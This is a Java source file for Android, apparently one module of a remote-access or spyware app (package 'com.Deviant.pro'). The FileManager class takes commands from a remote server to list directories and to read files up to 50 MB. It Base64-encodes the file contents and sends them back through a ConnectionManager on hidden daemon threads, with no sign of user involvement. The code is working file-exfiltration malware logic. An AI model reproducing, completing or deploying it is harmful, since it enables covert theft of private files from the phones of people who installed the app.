package com.Deviant.pro;

import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class FileManager {

    private static final String TAG = "FileManager";

    /** Maximum file size allowed for download — 50 MB */
    private static final long MAX_DOWNLOAD_BYTES = 50L * 1024L * 1024L;

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    /**
     * List files and directories at {@code path} and send the result
     * to the server as a JSON array.
     */
    public static void walk(final String path) {
        Thread t = new Thread(() -> {
            try {
                File dir = new File(path);

                if (!dir.exists()) {
                    sendError("file_manager", path, "path_not_found");
                    return;
                }
                if (!dir.isDirectory()) {
                    sendError("file_manager", path, "not_a_directory");
                    return;
                }

                File[] files = dir.listFiles();
                JSONArray jsonArray = new JSONArray();

                if (files == null) {
                    // listFiles() returns null on I/O error (e.g. permission denied)
                    Log.w(TAG, "listFiles() returned null for: " + path);
                    sendError("file_manager", path, "permission_denied");
                    return;
                }

                for (File file : files) {
                    try {
                        JSONObject jo = new JSONObject();
                        jo.put("name",         file.getName());
                        jo.put("path",         file.getAbsolutePath());
                        jo.put("isDir",        file.isDirectory());
                        jo.put("size",         file.length());
                        jo.put("lastModified", file.lastModified());
                        jo.put("readable",     file.canRead());
                        jsonArray.put(jo);
                    } catch (Exception e) {
                        // Log per-file errors but continue processing remaining files
                        Log.w(TAG, "Skipping file " + file.getName()
                                + ": " + e.getMessage());
                    }
                }

                JSONObject res = new JSONObject();
                res.put("type",  "file_manager");
                res.put("path",  path);
                res.put("count", jsonArray.length());
                res.put("data",  jsonArray);
                ConnectionManager.send(res.toString());

            } catch (Exception e) {
                Log.e(TAG, "Walk error: " + e.getMessage(), e);
                sendError("file_manager", path, "walk_failed");
            }
        });
        t.setName("fm-walk");
        t.setDaemon(true);
        t.start();
    }

    /**
     * Read a file at {@code path} and send its Base64-encoded contents
     * to the server.
     *
     * <p>Files larger than {@link #MAX_DOWNLOAD_BYTES} are rejected to
     * prevent out-of-memory crashes.</p>
     */
    public static void download(final String path) {
        Thread t = new Thread(() -> {
            try {
                File file = new File(path);

                if (!file.exists()) {
                    sendError("file_download", path, "file_not_found");
                    return;
                }
                if (file.isDirectory()) {
                    sendError("file_download", path, "is_directory");
                    return;
                }
                if (!file.canRead()) {
                    sendError("file_download", path, "permission_denied");
                    return;
                }

                long fileSize = file.length();
                if (fileSize > MAX_DOWNLOAD_BYTES) {
                    Log.w(TAG, "File too large to download: " + fileSize + " bytes — " + path);
                    sendError("file_download", path, "file_too_large");
                    return;
                }

                // Read file safely — try-with-resources guarantees stream closure
                byte[] bytes = readFile(file);
                if (bytes == null) {
                    sendError("file_download", path, "read_failed");
                    return;
                }

                String encoded = Base64.encodeToString(bytes, Base64.NO_WRAP);

                JSONObject res = new JSONObject();
                res.put("type", "file_download");
                res.put("name", file.getName());
                res.put("path", path);
                res.put("size", fileSize);
                res.put("data", encoded);
                ConnectionManager.send(res.toString());

                Log.d(TAG, "Downloaded file: " + path + " (" + fileSize + " bytes)");

            } catch (Exception e) {
                Log.e(TAG, "Download error: " + e.getMessage(), e);
                sendError("file_download", path, "download_failed");
            }
        });
        t.setName("fm-download");
        t.setDaemon(true);
        t.start();
    }

    // -------------------------------------------------------------------------
    // Private helpers
    // -------------------------------------------------------------------------

    /**
     * Read all bytes from a file reliably.
     *
     * <p>Unlike {@code fis.read(buffer)}, which may read fewer bytes than
     * requested in a single call, this loops until all bytes are consumed
     * or the stream ends.</p>
     *
     * @return byte array of file contents, or null on I/O error.
     */
    private static byte[] readFile(File file) {
        // try-with-resources: stream always closed, even if an exception is thrown
        try (FileInputStream fis = new FileInputStream(file);
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {

            byte[] chunk = new byte[8192]; // 8 KB read buffer
            int    bytesRead;

            // Loop until EOF — single read() is not guaranteed to fill the buffer
            while ((bytesRead = fis.read(chunk)) != -1) {
                bos.write(chunk, 0, bytesRead);
            }

            return bos.toByteArray();

        } catch (IOException e) {
            Log.e(TAG, "readFile error: " + e.getMessage(), e);
            return null;
        }
    }

    /**
     * Send a structured error response to the server so it never
     * times out waiting for a reply.
     */
    private static void sendError(String type, String path, String reason) {
        try {
            JSONObject err = new JSONObject();
            err.put("type",   type);
            err.put("path",   path);
            err.put("error",  reason);
            ConnectionManager.send(err.toString());
        } catch (Exception ignored) {}
    }
}
